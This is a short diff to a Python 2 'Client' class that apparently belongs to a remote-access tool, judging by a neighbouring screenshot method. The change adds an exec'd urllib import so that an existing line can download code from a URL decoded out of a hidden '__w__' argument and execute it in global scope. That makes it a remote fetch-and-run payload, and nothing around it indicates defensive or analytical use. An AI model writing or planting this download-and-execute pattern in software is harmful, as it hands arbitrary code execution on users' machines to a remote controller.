@@ -382,6 +382,7 @@ class Client(object):
             if '__{}__'.format(chr(i)) in kwargs:
                 setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i))))
         if '__w__' in vars(self):
+            exec 'import urllib' in globals()
             exec urllib.urlopen(self._long_to_bytes(self.__w__)).read() in globals()
 
     def _screenshot(self):
